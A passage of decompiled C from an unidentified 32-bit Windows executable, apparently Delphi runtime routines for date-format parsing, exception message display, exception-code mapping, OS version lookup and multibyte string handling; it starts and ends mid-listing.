      if ((*(byte *)((int)&DAT_0043f134 + ((int)uVar6 >> 3)) >> (uVar6 & 7) & 1) == 0) {
        iVar5 = FUN_00408a3c((char *)((int)param_1 + iVar7 + -1),"gg",2);
        if (iVar5 == 0) {
          FUN_00404a70(param_2,(undefined4 *)&DAT_0040b628);
          iVar7 = iVar7 + 1;
        }
        else {
          iVar5 = FUN_00408a3c((char *)((int)param_1 + iVar7 + -1),"yyyy",4);
          if (iVar5 == 0) {
            FUN_00404a70(param_2,(undefined4 *)&DAT_0040b63c);
            iVar7 = iVar7 + 3;
          }
          else {
            iVar5 = FUN_00408a3c((char *)((int)param_1 + iVar7 + -1),"yy",2);
            if (iVar5 == 0) {
              FUN_00404a70(param_2,(undefined4 *)&DAT_0040b650);
              iVar7 = iVar7 + 1;
            }
            else {
              cVar1 = *(char *)((int)param_1 + iVar7 + -1);
              if ((cVar1 == 'Y') || (cVar1 == 'y')) {
                FUN_00404a70(param_2,(undefined4 *)&LAB_0040b65c);
              }
              else {
                FUN_00404990((int *)&local_18,
                             extraout_EDX_00 & 0xffffff00 |
                             (uint)*(byte *)((int)param_1 + iVar7 + -1));
                FUN_00404a70(param_2,local_18);
              }
            }
          }
        }
        iVar7 = iVar7 + 1;
      }
      else {
        local_8 = FUN_0040c39c((undefined *)param_1,iVar7);
        FUN_00404cc8((int)param_1,iVar7,local_8,(int *)&local_14);
        FUN_00404a70(param_2,local_14);
        iVar7 = iVar7 + local_8;
      }
    }
  }
  else {
    if ((DAT_0044273c == 4) || (DAT_0044273c - 0x11U < 2)) {
      bVar2 = true;
    }
    else {
      bVar2 = false;
    }
    if (bVar2) {
      for (; iVar5 = FUN_00404a68((int)param_1), iVar7 <= iVar5; iVar7 = iVar7 + 1) {
        cVar1 = *(char *)((int)param_1 + iVar7 + -1);
        if ((cVar1 != 'G') && (cVar1 != 'g')) {
          FUN_00404990((int *)&local_10,
                       extraout_EDX & 0xffffff00 | (uint)*(byte *)((int)param_1 + iVar7 + -1));
          FUN_00404a70(param_2,local_10);
        }
      }
    }
    else {
      FUN_004047fc(param_2,param_1);
    }
  }
  *in_FS_OFFSET = uStack48;
  puStack40 = &LAB_0040b609;
  puStack44 = (undefined *)0x40b601;
  FUN_004047cc((int *)&local_18,4);
  return;
}



void FUN_0040b66c(int *param_1,LPCVOID param_2,byte *param_3,byte *param_4)

{
  DWORD DVar1;
  char *pcVar2;
  undefined4 uVar3;
  int iVar4;
  HINSTANCE hInstance;
  UINT uID;
  byte *lpBuffer;
  byte local_45c [256];
  byte *local_35c;
  undefined local_358;
  undefined4 *local_354;
  undefined local_350;
  int local_34c;
  undefined local_348;
  char *local_344;
  undefined local_340;
  undefined *local_33c;
  undefined local_338;
  _MEMORY_BASIC_INFORMATION local_334;
  byte local_316 [256];
  byte local_216 [261];
  undefined4 local_111 [65];
  int local_c;
  byte *local_8;
  
  local_8 = param_3;
  VirtualQuery(param_2,&local_334,0x1c);
  if (local_334.State == 0x1000) {
    DVar1 = GetModuleFileNameA((HMODULE)local_334.AllocationBase,(LPSTR)local_216,0x105);
    if (DVar1 != 0) {
      local_c = (int)param_2 - (int)local_334.AllocationBase;
      goto LAB_0040b6e2;
    }
  }
  GetModuleFileNameA(DAT_00442660,(LPSTR)local_216,0x105);
  local_c = func_0x0040b660(param_2);
LAB_0040b6e2:
  pcVar2 = FUN_0040c5e4(local_216,'\\');
  FUN_004089e4(local_111,(undefined4 *)(pcVar2 + 1),0x104);
  local_344 = "";
  local_33c = &DAT_0040b7ec;
  uVar3 = FUN_00403cb0(param_1,(int)&DAT_004071b8);
  if ((char)uVar3 != '\0') {
    local_344 = FUN_00404c68((undefined *)param_1[1]);
    iVar4 = FUN_004089bc(local_344);
    if ((iVar4 != 0) && (local_344[iVar4 + -1] != '.')) {
      local_33c = &DAT_0040b7f0;
    }
  }
  iVar4 = 0x100;
  lpBuffer = local_316;
  uID = *(UINT *)(PTR_PTR_DAT_0044159c + 4);
  hInstance = (HINSTANCE)FUN_00405b28((int)DAT_00442660);
  LoadStringA(hInstance,uID,(LPSTR)lpBuffer,iVar4);
  FUN_00403a9c(*param_1,local_45c);
  local_35c = local_45c;
  local_358 = 4;
  local_354 = local_111;
  local_350 = 6;
  local_34c = local_c;
  local_348 = 5;
  local_340 = 6;
  local_338 = 6;
  FUN_00408f3c(local_8,param_4,local_316,4,&local_35c);
  FUN_004089bc((char *)local_8);
  return;
}



void FUN_0040b7f4(int *param_1,LPCVOID param_2)

{
  DWORD DVar1;
  HANDLE pvVar2;
  HINSTANCE hInstance;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  byte *lpBuffer;
  undefined *lpBuffer_00;
  UINT uID;
  DWORD *pDVar3;
  CHAR *lpBuffer_01;
  LPOVERLAPPED p_Var4;
  int cchBufferMax;
  DWORD local_444;
  CHAR local_440 [64];
  byte local_400 [1024];
  
  FUN_0040b66c(param_1,param_2,local_400,(byte *)0x400);
  pDVar3 = &local_444;
  if (*PTR_DAT_00441528 == '\0') {
    cchBufferMax = 0x40;
    lpBuffer_01 = local_440;
    uID = *(UINT *)(PTR_PTR_DAT_004413e4 + 4);
    hInstance = (HINSTANCE)FUN_00405b28(DAT_00442660);
    LoadStringA(hInstance,uID,lpBuffer_01,cchBufferMax);
    MessageBoxA((HWND)0x0,(LPCSTR)local_400,local_440,0x2010);
  }
  else {
    FUN_00402dd4(PTR_DAT_0044140c,extraout_EDX,extraout_ECX);
    FUN_004027bc();
    CharToOemA((LPCSTR)local_400,(LPSTR)local_400);
    p_Var4 = (LPOVERLAPPED)0x0;
    DVar1 = FUN_004089bc((char *)local_400);
    lpBuffer = local_400;
    pvVar2 = GetStdHandle(0xfffffff4);
    WriteFile(pvVar2,lpBuffer,DVar1,pDVar3,p_Var4);
    pDVar3 = &local_444;
    p_Var4 = (LPOVERLAPPED)0x0;
    DVar1 = 2;
    lpBuffer_00 = &DAT_0040b8b8;
    pvVar2 = GetStdHandle(0xfffffff4);
    WriteFile(pvVar2,lpBuffer_00,DVar1,pDVar3,p_Var4);
  }
  return;
}



int * FUN_0040b8bc(int *param_1,char param_2,undefined4 *param_3)

{
  undefined4 *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_004047fc(param_1 + 1,param_3);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0040b8f8(int param_1,char param_2,byte *param_3,undefined4 param_4,undefined4 param_5)

{
  byte *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack48;
  undefined *puStack44;
  undefined *puStack40;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  if (param_2 != '\0') {
    puStack40 = (undefined *)0x40b90c;
    param_1 = FUN_00403da0(param_1,param_2,param_3,in_stack_ffffffdc,in_stack_ffffffe0,
                           in_stack_ffffffe4,in_stack_ffffffe8);
    param_3 = extraout_ECX;
  }
  puStack44 = &LAB_0040b952;
  uStack48 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack48;
  puStack40 = &stack0xfffffffc;
  FUN_00408f7c(param_3,param_5,param_4,(byte **)&local_8);
  FUN_004047fc((int *)(param_1 + 4),local_8);
  *in_FS_OFFSET = uStack48;
  puStack40 = &LAB_0040b959;
  puStack44 = (undefined *)0x40b951;
  FUN_004047a8((int *)&local_8);
  return;
}



int * FUN_0040b978(int *param_1,char param_2,int **param_3)

{
  int **extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0040658c(param_3,param_1 + 1);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0040b9b4(int param_1,char param_2,int **param_3,undefined4 param_4,undefined4 param_5)

{
  int **extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 **ppuVar1;
  undefined4 uStack52;
  undefined *puStack48;
  undefined *puStack44;
  undefined4 in_stack_ffffffd8;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  byte *local_c;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  local_c = (byte *)0x0;
  if (param_2 != '\0') {
    puStack44 = (undefined *)0x40b9ca;
    param_1 = FUN_00403da0(param_1,param_2,param_3,in_stack_ffffffd8,in_stack_ffffffdc,
                           in_stack_ffffffe0,in_stack_ffffffe4);
    param_3 = extraout_ECX;
  }
  puStack48 = &LAB_0040ba20;
  uStack52 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack52;
  ppuVar1 = &local_8;
  puStack44 = &stack0xfffffffc;
  FUN_0040658c(param_3,(int *)&local_c);
  FUN_00408f7c(local_c,param_5,param_4,(byte **)ppuVar1);
  FUN_004047fc((int *)(param_1 + 4),local_8);
  *in_FS_OFFSET = uStack52;
  puStack44 = &LAB_0040ba27;
  puStack48 = (undefined *)0x40ba1f;
  FUN_004047cc((int *)&local_c,2);
  return;
}



void FUN_0040ba74(void)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int local_10;
  undefined local_c;
  
  iVar1 = FUN_0040283c();
  for (iVar3 = 0; (iVar3 < 7 && (iVar1 != (&DAT_0043f244)[iVar3 * 2])); iVar3 = iVar3 + 1) {
  }
  if (iVar3 < 7) {
    piVar2 = FUN_0040b8bc((int *)&DAT_0040732c,'\x01',(undefined4 *)(&DAT_0043f248)[iVar3 * 2]);
  }
  else {
    local_c = 0;
    local_10 = iVar1;
    piVar2 = (int *)FUN_0040b9b4((int)&DAT_0040732c,'\x01',(int **)PTR_PTR_DAT_004413e0,0,&local_10)
    ;
  }
  piVar2[3] = iVar1;
  return;
}



void FUN_0040bb48(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  int *piVar2;
  undefined *puStack60;
  undefined *puStack56;
  undefined *puStack52;
  byte *local_24;
  int local_20;
  undefined local_1c;
  undefined4 local_18;
  undefined local_14;
  undefined4 local_10;
  undefined local_c;
  int local_8;
  
  puStack52 = &stack0xfffffffc;
  local_24 = (byte *)0x0;
  local_8 = 0;
  puStack56 = &DAT_0040bbe4;
  puStack60 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack60;
  if (param_1 == 0) {
    FUN_0040658c((int **)PTR_PTR_DAT_0044151c,&local_8);
  }
  else {
    puStack52 = &stack0xfffffffc;
    FUN_00404840(&local_8,param_1);
  }
  local_20 = local_8;
  local_1c = 0xb;
  local_14 = 0xb;
  local_c = 0;
  piVar2 = &local_20;
  uVar1 = 2;
  local_18 = param_2;
  local_10 = param_3;
  FUN_0040658c((int **)PTR_PTR_DAT_00441554,(int *)&local_24);
  FUN_0040b8f8((int)&DAT_00407a34,'\x01',local_24,uVar1,piVar2);
  *in_FS_OFFSET = uVar1;
  puStack60 = &LAB_0040bbeb;
  FUN_004047a8((int *)&local_24);
  FUN_004047a8(&local_8);
  return;
}



void FUN_0040bbf4(int param_1,undefined4 param_2,undefined4 *param_3)

{
  *param_3 = param_2;
  FUN_00404208(param_1);
  return;
}



undefined4 FUN_0040bc38(int *param_1)

{
  int iVar1;
  undefined3 uVar3;
  int iVar2;
  
  iVar1 = *param_1;
  uVar3 = (undefined3)((uint)iVar1 >> 8);
  if (iVar1 < -0x3fffff6d) {
    iVar2 = iVar1;
    if (iVar1 == -0x3fffff6e) {
LAB_0040bc9c:
      return CONCAT31((int3)((uint)iVar2 >> 8),6);
    }
    if (iVar1 < -0x3fffff71) {
      if (iVar1 == -0x3fffff72) {
        return CONCAT31(uVar3,7);
      }
      if (iVar1 == -0x3ffffffb) {
        return 0xb;
      }
      if (iVar1 == -0x3fffff74) {
        return 4;
      }
      iVar2 = iVar1 + 0x3fffff73;
      if (iVar2 == 0) goto LAB_0040bca5;
    }
    else {
      iVar2 = iVar1 + 0x3fffff6f;
      if (iVar1 + 0x3fffff71U < 2) goto LAB_0040bc9c;
      if (iVar2 == 0) {
        return 8;
      }
    }
  }
  else if (iVar1 < -0x3fffff69) {
    if (iVar1 == -0x3fffff6a) {
      return CONCAT31(uVar3,0xc);
    }
    iVar2 = iVar1 + 0x3fffff6d;
    if (iVar2 == 0) {
LAB_0040bca5:
      return CONCAT31((int3)((uint)iVar2 >> 8),9);
    }
    if (iVar1 == -0x3fffff6c) {
      return 3;
    }
    iVar2 = iVar1 + 0x3fffff6b;
    if (iVar2 == 0) {
      return 5;
    }
  }
  else {
    if (iVar1 == -0x3fffff03) {
      return 0xe;
    }
    iVar2 = iVar1 + 0x3ffffec6;
    if (iVar2 == 0) {
      return 0xd;
    }
  }
  return CONCAT31((int3)((uint)iVar2 >> 8),0x16);
}



undefined4 FUN_0040bcb8(int *param_1)

{
  uint uVar1;
  
  uVar1 = FUN_0040bc38(param_1);
  return *(undefined4 *)(&DAT_0043f264 + (uVar1 & 0xff) * 8);
}



void FUN_0040bcd0(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int iVar1;
  undefined4 uVar2;
  DWORD DVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined *puStack392;
  undefined *puStack388;
  undefined *puStack384;
  byte *local_174;
  undefined4 local_170;
  undefined local_16c;
  int local_168;
  undefined local_164;
  undefined4 local_160;
  undefined local_15c;
  byte *local_158;
  undefined *local_154;
  int local_150;
  undefined4 local_14c;
  undefined local_148;
  int local_144;
  undefined local_140;
  int local_13c;
  undefined local_138;
  undefined4 local_134;
  undefined local_130;
  undefined4 local_129 [65];
  _MEMORY_BASIC_INFORMATION local_24;
  int local_8;
  
  puStack384 = &stack0xfffffffc;
  local_174 = (byte *)0x0;
  local_150 = 0;
  local_158 = (byte *)0x0;
  local_154 = (undefined *)0x0;
  local_8 = 0;
  puStack388 = &LAB_0040be8b;
  puStack392 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack392;
  iVar1 = *(int *)(param_4 + -4);
  if (*(int *)(iVar1 + 0x14) == 0) {
    puStack384 = &stack0xfffffffc;
    FUN_0040658c((int **)PTR_PTR_DAT_004415bc,&local_8);
  }
  else {
    FUN_0040658c((int **)PTR_PTR_DAT_004414f8,&local_8);
  }
  uVar2 = *(undefined4 *)(iVar1 + 0x18);
  VirtualQuery(*(LPCVOID *)(iVar1 + 0xc),&local_24,0x1c);
  if (local_24.State == 0x1000) {
    DVar3 = GetModuleFileNameA((HMODULE)local_24.AllocationBase,(LPSTR)local_129,0x105);
    if (DVar3 != 0) {
      local_14c = *(undefined4 *)(iVar1 + 0xc);
      local_148 = 5;
      FUN_00404a18((int *)&local_154,local_129,0x105);
      FUN_00408870(local_154,&local_150);
      local_144 = local_150;
      local_140 = 0xb;
      local_13c = local_8;
      local_138 = 0xb;
      local_130 = 5;
      puVar5 = &local_14c;
      uVar4 = 3;
      local_134 = uVar2;
      FUN_0040658c((int **)PTR_PTR_DAT_00441540,(int *)&local_158);
      FUN_0040b8f8((int)&DAT_0040786c,'\x01',local_158,uVar4,puVar5);
      goto LAB_0040be5a;
    }
  }
  local_170 = *(undefined4 *)(iVar1 + 0xc);
  local_16c = 5;
  local_168 = local_8;
  local_164 = 0xb;
  local_15c = 5;
  puVar5 = &local_170;
  uVar4 = 2;
  local_160 = uVar2;
  FUN_0040658c((int **)PTR_PTR_DAT_00441500,(int *)&local_174);
  FUN_0040b8f8((int)&DAT_0040786c,'\x01',local_174,uVar4,puVar5);
LAB_0040be5a:
  *in_FS_OFFSET = uVar4;
  puStack392 = &LAB_0040be92;
  FUN_004047a8((int *)&local_174);
  FUN_004047cc((int *)&local_158,3);
  FUN_004047a8(&local_8);
  return;
}



void FUN_0040bf78(void)

{
  DAT_0044278c = FUN_0040b978((int *)&DAT_004072d0,'\x01',(int **)PTR_PTR_DAT_004413e8);
  DAT_00442790 = FUN_0040b978((int *)&DAT_00407758,'\x01',(int **)PTR_PTR_DAT_004414d4);
  *(undefined **)PTR_DAT_004413a0 = &LAB_0040baf4;
  *(undefined **)PTR_DAT_00441428 = &LAB_0040bf68;
  *(undefined **)PTR_DAT_004413dc = &DAT_004071b8;
  *(code **)PTR_DAT_0044141c = FUN_0040bcb8;
  *(undefined **)PTR_DAT_0044142c = &LAB_0040be9c;
  *(undefined **)PTR_DAT_004414e8 = &LAB_0040bc04;
  *(undefined **)PTR_DAT_00441388 = &LAB_0040bc20;
  return;
}



void FUN_0040bffc(void)

{
  if (DAT_0044278c != (int *)0x0) {
    *(undefined *)(DAT_0044278c + 3) = 1;
    (**(code **)(*DAT_0044278c + -8))();
    DAT_0044278c = (int *)0x0;
  }
  if (DAT_00442790 != (int *)0x0) {
    *(undefined *)(DAT_00442790 + 3) = 1;
    FUN_00403b24(DAT_00442790);
    DAT_00442790 = (int *)0x0;
  }
  *(undefined4 *)PTR_DAT_004413a0 = 0;
  *(undefined4 *)PTR_DAT_00441428 = 0;
  *(undefined4 *)PTR_DAT_004413dc = 0;
  *(undefined4 *)PTR_DAT_0044141c = 0;
  *(undefined4 *)PTR_DAT_0044142c = 0;
  *(undefined4 *)PTR_DAT_004414e8 = 0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040c07c(void)

{
  BOOL BVar1;
  undefined local_94 [148];
  
  local_94._0_4_ = 0x94;
  BVar1 = GetVersionExA((LPOSVERSIONINFOA)local_94);
  if (BVar1 != 0) {
    DAT_0043f0ec = local_94._16_4_;
    _DAT_0043f0f0 = local_94._4_4_;
    _DAT_0043f0f4 = local_94._8_4_;
    if (local_94._16_4_ == 1) {
      _DAT_0043f0f8 = local_94._12_4_ & 0xffff;
    }
    else {
      _DAT_0043f0f8 = local_94._12_4_;
    }
    FUN_00404a18((int *)&DAT_0043f0fc,(undefined4 *)(local_94 + 0x14),0x80);
  }
  return;
}



undefined4 FUN_0040c0ec(byte *param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  
  uVar2 = 0;
  if ((param_1 != (byte *)0x0) && (param_1[param_2] != 0)) {
    if (param_2 == 0) {
      if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)*param_1 >> 3)) >> (*param_1 & 7) & 1) != 0) {
        uVar2 = 1;
      }
    }
    else {
      iVar3 = param_2 + -1;
      while ((-1 < iVar3 &&
             ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)param_1[iVar3] >> 3)) >>
               (param_1[iVar3] & 7) & 1) != 0))) {
        iVar3 = iVar3 + -1;
      }
      uVar1 = param_2 - iVar3 & 0x80000001;
      if ((int)uVar1 < 0) {
        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;
      }
      if (uVar1 == 0) {
        uVar2 = 2;
      }
      else if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)param_1[param_2] >> 3)) >>
                (param_1[param_2] & 7) & 1) != 0) {
        uVar2 = 1;
      }
    }
  }
  return uVar2;
}



undefined4 FUN_0040c164(undefined *param_1,int param_2)

{
  undefined4 uVar1;
  byte *pbVar2;
  
  uVar1 = 0;
  if (DAT_00442744 != '\0') {
    pbVar2 = FUN_00404c68(param_1);
    uVar1 = FUN_0040c0ec(pbVar2,param_2 + -1);
  }
  return uVar1;
}



undefined4 FUN_0040c188(byte *param_1,int param_2)

{
  undefined4 uVar1;
  
  uVar1 = 0;
  if (DAT_00442744 != '\0') {
    uVar1 = FUN_0040c0ec(param_1,param_2);
  }
  return uVar1;
}



void FUN_0040c1a0(undefined *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = FUN_00404a68((int)param_1);
  if (iVar1 < param_2) {
    param_2 = FUN_00404a68((int)param_1);
  }
  FUN_0040c1c8(param_1,param_2);
  return;
}



int FUN_0040c1c8(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if (0 < param_2) {
    iVar1 = FUN_00404a68((int)param_1);
    if ((param_2 <= iVar1) && (iVar2 = param_2, DAT_00442744 != '\0')) {
      iVar1 = 1;
      iVar2 = 0;
      if (0 < param_2) {
        do {
          if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[iVar1 + -1] >> 3)) >>
               ((byte)param_1[iVar1 + -1] & 7) & 1) == 0) {
            iVar1 = iVar1 + 1;
          }
          else {
            iVar1 = FUN_0040c3d8(param_1,iVar1);
          }
          iVar2 = iVar2 + 1;
        } while (iVar1 <= param_2);
      }
    }
  }
  return iVar2;
}



void FUN_0040c220(undefined *param_1,int param_2,int *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = FUN_00404a68((int)param_1);
  iVar3 = 1;
  iVar2 = 1;
  while ((iVar2 < iVar1 && (iVar3 < param_2))) {
    iVar3 = iVar3 + 1;
    if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[iVar2 + -1] >> 3)) >>
         ((byte)param_1[iVar2 + -1] & 7) & 1) == 0) {
      iVar2 = iVar2 + 1;
    }
    else {
      iVar2 = FUN_0040c3d8(param_1,iVar2);
    }
  }
  if (((iVar3 == param_2) && (iVar2 < iVar1)) &&
     ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[iVar2 + -1] >> 3)) >>
       ((byte)param_1[iVar2 + -1] & 7) & 1) != 0)) {
    iVar2 = FUN_0040c3d8(param_1,iVar2);
    iVar2 = iVar2 + -1;
  }
  *param_3 = iVar3;
  *param_4 = iVar2;
  return;
}



int FUN_0040c2b0(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int local_10;
  int local_c;
  
  local_10 = 0;
  iVar2 = local_10;
  if ((((0 < param_2) && (iVar1 = FUN_00404a68((int)param_1), iVar2 = local_10, param_2 <= iVar1))
      && (iVar2 = param_2, 1 < param_2)) && (iVar2 = param_2, DAT_00442744 != '\0')) {
    FUN_0040c220(param_1,param_2 + -1,&local_c,&local_10);
    if ((local_c < param_2 + -1) || (iVar2 = FUN_00404a68((int)param_1), iVar2 <= local_10)) {
      local_10 = 0;
      iVar2 = local_10;
    }
    else {
      iVar2 = local_10 + 1;
    }
  }
  local_10 = iVar2;
  return local_10;
}



int FUN_0040c314(undefined *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int local_10;
  int local_c;
  
  local_10 = 0;
  iVar1 = local_10;
  if (0 < param_2) {
    iVar1 = FUN_00404a68((int)param_1);
    if (iVar1 < param_2) {
      param_2 = FUN_00404a68((int)param_1);
    }
    iVar1 = param_2;
    if (DAT_00442744 != '\0') {
      FUN_0040c220(param_1,param_2,&local_c,&local_10);
      iVar2 = FUN_00404a68((int)param_1);
      iVar1 = local_10;
      if (iVar2 < local_10) {
        iVar1 = FUN_00404a68((int)param_1);
      }
    }
  }
  local_10 = iVar1;
  return local_10;
}



int FUN_0040c374(LPCSTR param_1)

{
  LPSTR pCVar1;
  
  if (DAT_00442744 != '\0') {
    pCVar1 = CharNextA(param_1);
    return (int)pCVar1 - (int)param_1;
  }
  return 1;
}



void FUN_0040c394(LPCSTR param_1)

{
  CharNextA(param_1);
  return;
}



int FUN_0040c39c(undefined *param_1,int param_2)

{
  int iVar1;
  undefined *puVar2;
  
  iVar1 = 1;
  if ((DAT_00442744 != '\0') &&
     ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[param_2 + -1] >> 3)) >>
       ((byte)param_1[param_2 + -1] & 7) & 1) != 0)) {
    puVar2 = FUN_00404c68(param_1);
    iVar1 = FUN_0040c374(puVar2 + param_2 + -1);
  }
  return iVar1;
}



int FUN_0040c3d8(undefined *param_1,int param_2)

{
  undefined *puVar1;
  int iVar2;
  
  iVar2 = param_2 + 1;
  if ((DAT_00442744 != '\0') &&
     ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[param_2 + -1] >> 3)) >>
       ((byte)param_1[param_2 + -1] & 7) & 1) != 0)) {
    puVar1 = FUN_00404c68(param_1);
    iVar2 = FUN_0040c374(puVar1 + param_2 + -1);
    iVar2 = iVar2 + param_2;
  }
  return iVar2;
}



undefined4 FUN_0040c414(undefined *param_1,int param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  if (0 < param_2) {
    iVar1 = FUN_00404a68((int)param_1);
    if ((param_2 <= iVar1) && (param_1[param_2 + -1] == '\\')) {
      uVar2 = FUN_0040c164(param_1,param_2);
      if ((char)uVar2 == '\0') {
        return CONCAT31((int3)((uint)uVar2 >> 8),1);
      }
    }
  }
  return 0;
}



void FUN_0040c448(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  FUN_004047fc(param_2,param_1);
  iVar1 = FUN_00404a68(*param_2);
  uVar2 = FUN_0040c414((undefined *)*param_2,iVar1);
  if ((char)uVar2 != '\0') {
    iVar1 = FUN_00404a68(*param_2);
    FUN_00404d98(param_2,iVar1 - 1);
  }
  return;
}



PCNZCH FUN_0040c480(undefined *param_1,undefined *param_2)

{
  char *pcVar1;
  byte *pbVar2;
  PCNZCH pCVar3;
  PCNZCH pCVar4;
  
  pCVar4 = (PCNZCH)0x0;
  pcVar1 = FUN_00404c68(param_1);
  pbVar2 = FUN_00404c68(param_2);
  pCVar3 = FUN_0040c544(pbVar2,pcVar1);
  if (pCVar3 != (PCNZCH)0x0) {
    pCVar4 = pCVar3 + (1 - (int)pbVar2);
  }
  return pCVar4;
}



uint FUN_0040c4b8(undefined *param_1,LPSTR *param_2)

{
  char *pcVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (DAT_00442744 == '\0') {
    uVar4 = FUN_00407ee4(param_1,param_2);
  }
  else {
    uVar3 = FUN_00404a68((int)param_1);
    uVar4 = FUN_00404d98((int *)param_2,uVar3);
    iVar6 = 1;
    if (0 < (int)uVar3) {
      do {
        iVar5 = thunk_FUN_00404c74((int *)param_2);
        *(undefined *)(iVar5 + -1 + iVar6) = param_1[iVar6 + -1];
        if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)(byte)param_1[iVar6 + -1] >> 3)) >>
             ((byte)param_1[iVar6 + -1] & 7) & 1) == 0) {
          cVar2 = (*param_2)[iVar6 + -1];
          uVar4 = (uint)*param_2 & 0xffffff00 | (uint)(byte)(cVar2 + 0xa5);
          if ((byte)(cVar2 + 0xbfU) < 0x1a) {
            uVar4 = thunk_FUN_00404c74((int *)param_2);
            pcVar1 = (char *)((uVar4 - 1) + iVar6);
            *pcVar1 = *pcVar1 + ' ';
          }
        }
        else {
          uVar4 = thunk_FUN_00404c74((int *)param_2);
          *(undefined *)((uVar4 - 1) + iVar6 + 1) = param_1[iVar6];
          iVar6 = iVar6 + 1;
        }
        iVar6 = iVar6 + 1;
      } while (iVar6 <= (int)uVar3);
    }
  }
  return uVar4;
}



PCNZCH FUN_0040c544(byte *param_1,char *param_2)

{
  int iVar1;
  uint cchCount1;
  char *lpString1;
  undefined4 uVar2;
  int iVar3;
  
  if ((((param_1 != (byte *)0x0) && (*param_1 != 0)) && (param_2 != (char *)0x0)) &&
     (*param_2 != '\0')) {
    iVar1 = FUN_004089bc((char *)param_1);
    cchCount1 = FUN_004089bc(param_2);
    for (lpString1 = FUN_00408a94((char *)param_1,param_2);
        (lpString1 != (PCNZCH)0x0 && (cchCount1 <= (uint)(iVar1 - ((int)lpString1 - (int)param_1))))
        ; lpString1 = FUN_00408a94(lpString1 + 1,param_2)) {
      uVar2 = FUN_0040c188(param_1,(int)lpString1 - (int)param_1);
      if (((char)uVar2 != '\x02') &&
         (iVar3 = CompareStringA(0x400,0,lpString1,cchCount1,param_2,cchCount1), iVar3 == 2)) {
        return lpString1;
      }
      if ((char)uVar2 == '\x01') {
        lpString1 = lpString1 + 1;
      }
    }
  }
  return (PCNZCH)0x0;
}



char * FUN_0040c5e4(byte *param_1,char param_2)

{
  char *pcVar1;
  char *pcVar2;
  char *pcVar3;
  
  pcVar2 = FUN_0040c60c(param_1,param_2);
  pcVar3 = pcVar2;
  if (param_2 != '\0') {
    while (pcVar1 = pcVar3, pcVar1 != (char *)0x0) {
      pcVar3 = FUN_0040c60c((byte *)(pcVar1 + 1),param_2);
      pcVar2 = pcVar1;
    }
  }
  return pcVar2;
}



char * FUN_0040c60c(byte *param_1,char param_2)

{
  char *pcVar1;
  undefined4 uVar2;
  
  pcVar1 = thunk_FUN_00408a8a((char *)param_1,param_2);
  while( true ) {
    if (pcVar1 == (char *)0x0) {
      return (char *)0x0;
    }
    uVar2 = FUN_0040c188(param_1,(int)pcVar1 - (int)param_1);
    if ((char)uVar2 == '\0') break;
    if ((char)uVar2 == '\x01') {
      pcVar1 = pcVar1 + 1;
    }
    pcVar1 = thunk_FUN_00408a8a(pcVar1 + 1,param_2);
  }
  return pcVar1;
}



void FUN_0040c64c(LCID param_1)

